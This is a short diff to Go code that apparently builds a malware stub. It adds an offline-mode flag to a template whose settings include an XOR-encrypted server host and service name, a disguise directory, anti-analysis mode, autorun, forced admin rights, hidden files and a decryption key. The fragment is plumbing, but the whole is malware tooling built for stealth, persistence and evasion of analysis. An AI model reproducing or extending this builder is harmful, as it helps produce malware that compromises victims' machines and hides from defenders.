@@ -127,6 +127,7 @@ type globalValues struct {
 	EncDisguiseDir      string
 	EncLocalAppDataEnv  string
 	AntiAnalysisMode    string
+	OfflineMode         bool
 	XorKeyLiteral       string
 }
 
@@ -292,6 +293,7 @@ func buildGlobals(cfg Config) (globalValues, error) {
 		EncDisguiseDir:      xorWithKey(pickDisguiseDir(), key),
 		EncLocalAppDataEnv:  xorWithKey("LOCALAPPDATA", key),
 		AntiAnalysisMode:  strings.TrimSpace(cfg.AntiAnalysis),
+		OfflineMode:       cfg.OfflineMode,
 		XorKeyLiteral:     escapeGoString(key),
 	}, nil
 }
@@ -308,6 +310,11 @@ func templateGlobals(cfg Config) (string, error) {
 		goHideFiles = "true"
 	}
 
+	goOfflineMode := "false"
+	if g.OfflineMode {
+		goOfflineMode = "true"
+	}
+
 	return strings.TrimSpace(fmt.Sprintf(`
 var forceAdminMode = "%s"
 var autorunMode = "%s"
@@ -315,6 +322,7 @@ var hideFilesEnabled = %s
 var installMode = "%s"
 var customInstallPath = "%s"
 var antiAnalysisMode = "%s"
+var offlineModeEnabled = %s
 
 var encServerHost = []byte{%s}
 var encServiceName = []byte{%s}
@@ -438,6 +446,7 @@ var decryptionKey = []byte("%s")
 		escapeGoString(g.InstallMode),
 		g.CustomInstallPath,
 		escapeGoString(g.AntiAnalysisMode),
+		goOfflineMode,
 
 		g.EncServerHost,
 		g.EncServiceName,
